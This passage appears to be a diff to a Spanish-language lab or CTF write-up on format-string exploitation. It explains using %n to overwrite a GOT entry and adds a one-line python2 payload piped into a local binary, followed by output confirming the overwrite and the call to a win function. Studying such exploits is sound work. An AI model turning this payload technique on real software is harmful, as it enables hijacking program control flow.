@@ -447,3 +447,11 @@ Recordemos que %n escribe en una dirección la cantidad de caracteres
 que se han imprimido hasta el momento. Para escribir la dirección 0x08049176
 en la global offset table, tenemos que hacer que printf imprima 0x08049176 (134517110)
 caracteres antes. Podemos usar el formato %134517110c para lograr esto.
+
+```
+$ python2 -c "print b'%134517110c%8\$n-\x08\xc0\x04\x08'" | ./ptf_w
+Ingrese su input:                                                                                                                                                                                                                                                                                                                                                 (output recortado)-
+GOT modificado correctamente
+```
+
+De esta forma logramos hacer que se ejecutara la función win.
